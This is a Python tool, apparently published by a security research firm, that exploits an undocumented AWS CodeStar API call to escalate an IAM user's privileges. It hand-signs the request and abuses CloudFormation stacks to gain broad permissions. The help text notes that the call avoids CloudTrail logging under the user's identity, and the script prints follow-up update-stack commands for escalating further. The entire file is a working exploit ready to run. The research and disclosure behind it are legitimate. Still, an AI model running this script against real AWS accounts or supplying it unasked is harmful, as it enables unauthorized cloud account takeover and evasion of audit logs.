#!/usr/bin/env python3

# Spencer Gietzen of Rhino Security Labs
# Blog link: https://rhinosecuritylabs.com/aws/escalating-aws-iam-privileges-undocumented-codestar-api
# GitHub link: https://github.com/RhinoSecurityLabs/Cloud-Security-Research/blob/master/AWS/codestar_createprojectfromtemplate_privesc/CodeStarPrivEsc.py

import sys
import datetime
import hashlib
import hmac
import random
import string
import json
import argparse

import requests
import boto3

from botocore.exceptions import ProfileNotFound


def main(args):
    codestar_project_name = ''.join(random.choice(string.ascii_lowercase) for x in range(10))

    # Either all or none for VPC ID, subnet ID, and key pair name required
    # How is this not already possible in "argparse"?
    ec2_arguments = [args.vpc_id, args.subnet_id, args.key_pair_name]
    if any(ec2_arguments) and not all(ec2_arguments):
        print('You must supply all or none of the --vpc-id/-v, --subnet-id/-s, and --key-pair-name/-k arguments!\nExiting...')
        sys.exit(1)

    if args.profile is None:
        session = boto3.session.Session()
        print('No AWS CLI profile passed in, choose one below belonging to an IAM user (not an IAM role) or rerun the script using the -p/--profile argument:')
        profiles = session.available_profiles
        for i in range(0, len(profiles)):
            print('    [{}] {}'.format(i, profiles[i]))
        profile_number = int(input('Choose a profile (Ctrl+C to exit): ').strip())
        profile_name = profiles[profile_number]
    else:
        try:
            profile_name = args.profile
            session = boto3.session.Session(profile_name=profile_name)
        except ProfileNotFound as error:
            print('Did not find the specified AWS CLI profile: {}\n'.format(profile_name))

            session = boto3.session.Session()
            print('Profiles that are available: {}\n'.format(session.available_profiles))
            print('Quitting...\n')
            sys.exit(1)

    method = 'POST'
    service = 'codestar'
    region = check_codestar_region(args.region)
    host = '{}.{}.amazonaws.com'.format(service, region)
    endpoint = 'https://{}/'.format(host)
    content_type = 'application/x-amz-json-1.1'
    amz_target = 'CodeStar_20170419.CreateProjectFromTemplate'

    # Request parameters passed in a JSON block.
    if args.vpc_id and args.subnet_id:
        request_parameters = json.dumps(
            {
                'id': codestar_project_name,
                'name': codestar_project_name,
                'projectTemplateId': 'arn:aws:codestar:{}::project-template/codecommit/webapp-pythondjango-ec2'.format(region),
                'templateAttributes': {
                    'parameterMap': {
                        'AppName': codestar_project_name,
                        'InstanceType': 't2.micro',
                        'KeyPairName': args.key_pair_name,
                        'ProjectId': codestar_project_name,
                        'RepositoryName': codestar_project_name,
                        'RepositoryProvider': 'CodeCommit',
                        'SubnetId': args.subnet_id,
                        'VpcId': args.vpc_id
                    }
                }
            }
        )
    else:
        request_parameters = json.dumps(
            {
                'id': codestar_project_name,
                'name': codestar_project_name,
                'projectTemplateId': 'arn:aws:codestar:{}::project-template/codecommit/webservice-pythonservice-lambda'.format(region),
                'templateAttributes': {
                    'parameterMap': {
                        'AppName': codestar_project_name,
                        'ProjectId': codestar_project_name,
                        'RepositoryName': codestar_project_name,
                        'RepositoryProvider': 'CodeCommit'
                    }
                }
            }
        )

    # Key derivation functions. See:
    # http://docs.aws.amazon.com/general/latest/gr/signature-v4-examples.html#signature-v4-examples-python
    def sign(key, msg):
        return hmac.new(key, msg.encode('utf-8'), hashlib.sha256).digest()

    def getSignatureKey(key, date_stamp, regionName, serviceName):
        kDate = sign(('AWS4' + key).encode('utf-8'), date_stamp)
        kRegion = sign(kDate, regionName)
        kService = sign(kRegion, serviceName)
        kSigning = sign(kService, 'aws4_request')
        return kSigning

    # Get AWS creds
    session = boto3.session.Session(profile_name=profile_name)
    credentials = session.get_credentials()
    access_key = credentials.access_key
    secret_key = credentials.secret_key
    session_token = credentials.token

    if not access_key:
        print('No access key found in profile {}.'.format(profile_name))
        sys.exit(1)
    if not secret_key:
        print('No secret key found in profile {}.'.format(profile_name))
        sys.exit(1)
    if session_token:
        exit = input('Found a session token for profile {}. This method only supports escalating the privileges of IAM users and not IAM roles. If this profile belongs to an IAM role, enter "q" to quit. Otherwise, just press enter to continue.')
        if exit.rstrip().lower() == 'q':
            sys.exit(0)

    if args.user_name:
        user_name = args.user_name
    else:
        tmp_identity = session.client('sts').get_caller_identity()
        account_id = tmp_identity['Account']
        user_name = tmp_identity['Arn'].split('user/')[1]
        if '/' in user_name:
            user_name = user_name.split('/')[-1]

    # Create a date for headers and the credential string
    t = datetime.datetime.utcnow()
    amz_date = t.strftime('%Y%m%dT%H%M%SZ')
    date_stamp = t.strftime('%Y%m%d')  # Date w/o time, used in credential scope

    # http://docs.aws.amazon.com/general/latest/gr/sigv4-create-canonical-request.html

    canonical_uri = '/'
    canonical_querystring = ''

    # Create the canonical headers. Header names must be trimmed
    # and lowercase, and sorted in code point order from low to high.
    # Note that there is a trailing \n.
    # Also create the list of signed headers. This lists the headers
    # in the canonical_headers list, delimited with ";" and in alpha order.
    # Note: The request can include any headers; canonical_headers and
    # signed_headers include those that you want to be included in the
    # hash of the request. "Host" and "x-amz-date" are always required.
    if session_token:
        canonical_headers = 'content-type:' + content_type + '\n' + 'host:' + host + '\n' + 'x-amz-date:' + amz_date + '\n' + 'x-amz-security-token:' + session_token + '\n' + 'x-amz-target:' + amz_target + '\n'
        signed_headers = 'content-type;host;x-amz-date;x-amz-security-token;x-amz-target'
    else:
        canonical_headers = 'content-type:' + content_type + '\n' + 'host:' + host + '\n' + 'x-amz-date:' + amz_date + '\n' + 'x-amz-target:' + amz_target + '\n'
        signed_headers = 'content-type;host;x-amz-date;x-amz-target'

    # Create payload hash. In this example, the payload (body of the request) contains the request parameters
    payload_hash = hashlib.sha256(request_parameters.encode('utf-8')).hexdigest()

    # Combine elements to create canonical request
    canonical_request = method + '\n' + canonical_uri + '\n' + canonical_querystring + '\n' + canonical_headers + '\n' + signed_headers + '\n' + payload_hash

    # Match the algorithm to the hashing algorithm you use, either SHA-1 or SHA-256
    algorithm = 'AWS4-HMAC-SHA256'
    credential_scope = date_stamp + '/' + region + '/' + service + '/' + 'aws4_request'
    string_to_sign = algorithm + '\n' + amz_date + '\n' + credential_scope + '\n' + hashlib.sha256(canonical_request.encode('utf-8')).hexdigest()

    # Create the signing key using the function defined above.
    signing_key = getSignatureKey(secret_key, date_stamp, region, service)

    # Sign the string_to_sign using the signing_key
    signature = hmac.new(signing_key, (string_to_sign).encode('utf-8'), hashlib.sha256).hexdigest()

    # Put the signature information in a header named Authorization.
    authorization_header = algorithm + ' ' + 'Credential=' + access_key + '/' + credential_scope + ', ' + 'SignedHeaders=' + signed_headers + ', ' + 'Signature=' + signature

    # The 'host' header is added automatically
    if session_token:
        headers = {
            'Content-Type': content_type,
            'X-Amz-Date': amz_date,
            'X-Amz-Security-Token': session_token,
            'X-Amz-Target': amz_target,
            'Authorization': authorization_header
        }
    else:
        headers = {
            'Content-Type': content_type,
            'X-Amz-Date': amz_date,
            'X-Amz-Target': amz_target,
            'Authorization': authorization_header
        }

    r = requests.post(
        endpoint,
        data=request_parameters,
        headers=headers
    )

    response = r.json()
    if not response.get('stackId'):
        print('codestar:CreateProjectFromTemplate Response:\n    {}\n'.format(response))

    # Because STS GetCallerIdentity was not run, parse the account ID
    if args.user_name:
        account_id = response['stackId'].split('arn:aws:cloudformation:{}:'.format(region))[1].split(':stack/')[0]

    # If EC2/VPC details aren't passed in, the second CF stack will be "lambda" instead of "infrastructure"
    if args.vpc_id:
        suffix = 'infrastructure'
        final_policy_version = '4'
    else:
        suffix = 'lambda'
        final_policy_version = '3'

    print('The privilege escalation process has began...')
    print('    CloudFormation Stack ARN: {}'.format(response['stackId']))
    print('\n---------------------------------------------\n')
    print('You should immediately be granted some additional privileges, but when the above CloudFormation stack has completed deployment, the privilege escalation process will be done and you will have been granted far more privileges.\nIncluded in those new privileges is the "cloudformation:UpdateStack" permission on the above stack and another stack with the same name, but with "-{}" appended to it. That role is granted a large amount of access to the current AWS environment, but we do not have the ability to IAM PassRole it. Luckily, the role has already been passed to the awscodestar-{}-{} stack, so we can still take advantage of it without needing to pass it. Be patient, it might take a while to deploy (up to 10 minutes or so, sometimes faster).'.format(suffix, codestar_project_name, suffix))

    print('\nTo retrieve the permissions granted to your user, run the following command. You will know that the privilege escalation is complete when the IAM policy version specified in the command below exists:')
    print('\naws iam get-policy-version --profile {} --policy-arn arn:aws:iam::{}:policy/CodeStar_{}_Owner --version-id v{}'.format(profile_name, account_id, codestar_project_name, final_policy_version))

    print('\nTo escalate yourself further, run the following command, where the CloudFormation stack will be updated and instructed to create whatever you include in your template. You won\'t be able to view the permissions of that role, but they should always be the same (or close to it at least), so visit this link to review the permissions granted to the CloudFormation role: https://GITHUB-LINK-TO-CLOUDFORMATION-ROLE-POLICY')
    print('\naws cloudformation update-stack --profile {} --region {} --stack-name awscodestar-{}-{} --capabilities "CAPABILITY_NAMED_IAM" --template-body file://PATH-TO-CLOUDFORMATION-TEMPLATE'.format(profile_name, region, codestar_project_name, suffix))


def check_codestar_region(region):
    session = boto3.session.Session(profile_name=None)
    supported_regions = session.get_available_regions('codestar')
    if region in supported_regions:
        return region
    else:
        print('CodeStar is not supported in region {}.\nYou must choose one from the following supported regions:'.format(region))
        for supported_region in supported_regions:
            print('  - {}'.format(supported_region))
        print('\nNote: If the supported region list looks incorrect, you may need to update your boto3/botocore Python libraries (pip3 install --upgrade boto3 botocore)')
        sys.exit(1)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='This script accepts AWS IAM user (not IAM role) credentials and abuses the "codestar:CreateProjectFromTemplate" permission to escalate privileges in the AWS environment.\nNOTE: The API call will not be logged to CloudTrail, but there will be many CloudTrail logs generated from the process of the privilege escalation taking place, originating from a few different IAM roles, but none from your IAM user.\nNOTE: Many resources will be created in the environment during this process, including resources in CodeStar, CodeBuild, CodePipeline, CodeDeploy, CodeCommit, CloudFormation, IAM, CloudWatch Logs, CloudWatch Events, and S3 (and possibly others).\nNOTE: If the CodeStar project/CloudFormation stack is deleted, you will lose your escalated privileges, unless you you took precautions to survive the cleanup of all the created resources.\nNOTE: When deleting the CodeStar project, every resource created SHOULD be deleted from the account, but I have run into a lot of trouble with this where the teardown of the resources fail for an unknown reason, then there will be lost resources in the account that must be manually deleted.\nNOTE: You will gain more/slightly different privileges if you pass in the --vpc-id, --subnet-id, and --key-pair-name parameters! If you do not pass those in, it will use an alternate method that grants a few less privileges. If you want, you could run the script without the VPC ID, subnet ID, and key pair name parameters, use the privileges you escalated to to enumerate existing VPCs/subnets/key pair names, then rerun the script with those arguments to gain those further privileges.\nMore information can be found on the blog about this privilege escalation method: https://rhinosecuritylabs.com/aws/escalating-aws-iam-privileges-undocumented-codestar-api')

    parser.add_argument('-p', '--profile', required=False, default=None, help='The AWS CLI profile of the IAM user to escalate the privileges of. This is usually stored under ~/.aws/credentials. You will be prompted by default. NOTE: This privilege escalation method only supports IAM users! It will not work if you provide a profile belonging to an IAM role.')
    parser.add_argument('-r', '--region', required=False, default='us-east-1', help='The AWS region to create the CodeStar project in. By default, us-east-1 (North Virginia) will be targeted.')
    parser.add_argument('-v', '--vpc-id', required=False, default=None, help='The ID of a VPC within the target AWS environment. By providing this argument, along with --subnet-id and --key-pair-name, you will gain a few more privileges than if you omit them.')
    parser.add_argument('-s', '--subnet-id', required=False, default=None, help='The ID of a subnet within the VPC passed into --vpc-id. By providing this argument, along with --vpc-id and --key-pair-name, you will gain a few more privileges than if you omit them.')
    parser.add_argument('-k', '--key-pair-name', required=False, default=None, help='The name of an EC2 SSH key pair file stored in AWS. By providing this argument, along with --vpc-id and --subnet-id, you will gain a few more privileges than if you omit them.')
    parser.add_argument('-u', '--user-name', required=False, default=None, help='The user name of your IAM user that you are trying to escalate (owner of the keys you are using). If not supplied, the STS GetCallerIdentity API will be used to determine the user\'s name.')

    args = parser.parse_args()

    main(args)
